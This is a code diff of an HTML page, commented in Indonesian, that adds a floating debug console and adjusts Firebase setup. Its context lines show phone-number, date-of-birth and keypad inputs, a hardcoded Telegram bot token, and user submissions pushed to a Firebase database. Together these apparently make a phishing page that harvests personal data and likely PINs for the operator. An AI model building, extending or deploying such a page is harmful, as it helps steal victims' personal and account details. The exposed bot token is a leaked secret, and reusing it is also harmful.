@@ -44,6 +44,43 @@ color: #ef4444;
 background-color: #ef4444;
 color: white;
 }
+/* Floating Console Styling */
+.floating-console {
+    position: fixed;
+    bottom: 1rem;
+    left: 1rem;
+    width: 90%;
+    max-width: 350px;
+    max-height: 200px;
+    background-color: rgba(0, 0, 0, 0.7);
+    color: white;
+    font-family: monospace;
+    font-size: 10px;
+    padding: 0.5rem;
+    border-radius: 0.5rem;
+    overflow-y: auto;
+    z-index: 9999;
+    border: 1px solid #333;
+}
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 0.5rem;
+}
+.console-header button {
+    background: #ef4444;
+    color: white;
+    border: none;
+    padding: 0.25rem 0.5rem;
+    border-radius: 0.25rem;
+    cursor: pointer;
+    font-size: 10px;
+}
+.console-output {
+    word-wrap: break-word;
+    white-space: pre-wrap;
+}
 </style>
 </head>
 <body class="bg-black">
@@ -73,6 +110,15 @@ color: white;
 </div>
 </div>
 
+<!-- Floating Console -->
+<div id="floatingConsole" class="floating-console">
+    <div class="console-header">
+        <span>Console</span>
+        <button id="clearConsoleBtn">Clear</button>
+    </div>
+    <div id="consoleOutput" class="console-output"></div>
+</div>
+
 <script type="module">
 // Import Firebase modules
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
@@ -80,15 +126,15 @@ import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12
 
 // --- Firebase Configuration ---
 // Mengambil konfigurasi Firebase dari lingkungan Canvas.
-// Ini memperbaiki 'TypeError: undefined is not an object'.
-const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
+const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
 
 // Initialize Firebase.
 let app;
 let database;
-if (Object.keys(firebaseConfig).length > 0) {
+if (firebaseConfig) {
     app = initializeApp(firebaseConfig);
     database = getDatabase(app);
+    console.log("Firebase initialized successfully.");
 } else {
     console.error("Firebase configuration not found. Please ensure it is provided in the environment.");
 }
@@ -100,6 +146,46 @@ const phoneNumberInput = document.getElementById('phoneNumberInput');
 const dobInput = document.getElementById('dobInput');
 const selectionContainer = document.getElementById('selectionContainer');
 const keypadTitle = document.getElementById('keypadTitle');
+const floatingConsole = document.getElementById('floatingConsole');
+const consoleOutput = document.getElementById('consoleOutput');
+const clearConsoleBtn = document.getElementById('clearConsoleBtn');
+
+// --- Custom Floating Console Logic ---
+const originalConsole = {
+    log: console.log,
+    warn: console.warn,
+    error: console.error,
+};
+
+function appendToConsole(message, type = 'log') {
+    const p = document.createElement('p');
+    const timestamp = new Date().toLocaleTimeString();
+    p.textContent = `[${timestamp}] ${message}`;
+    if (type === 'error') p.style.color = '#ef4444';
+    else if (type === 'warn') p.style.color = '#f59e0b';
+    else p.style.color = '#a0aec0';
+    consoleOutput.appendChild(p);
+    consoleOutput.scrollTop = consoleOutput.scrollHeight; // Scroll to bottom
+}
+
+console.log = (...args) => {
+    originalConsole.log(...args);
+    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'log');
+};
+
+console.warn = (...args) => {
+    originalConsole.warn(...args);
+    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'warn');
+};
+
+console.error = (...args) => {
+    originalConsole.error(...args);
+    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'error');
+};
+
+clearConsoleBtn.addEventListener('click', () => {
+    consoleOutput.innerHTML = '';
+});
 
 // --- Telegram API Config ---
 const TELEGRAM_BOT_TOKEN = '7639651359:AAF4XflfPvNvT6ku5APx3bSuzzbyG2cB_FY';
@@ -175,6 +261,7 @@ timestamp: new Date().toISOString()
 // Check if Firebase database is initialized before pushing
 if (database) {
   try {
+    // Pushing data to Firebase Realtime Database
     await push(ref(database, 'userSubmissions'), userData);
     console.log("Data berhasil disimpan ke Firebase!");
   } catch (error) {
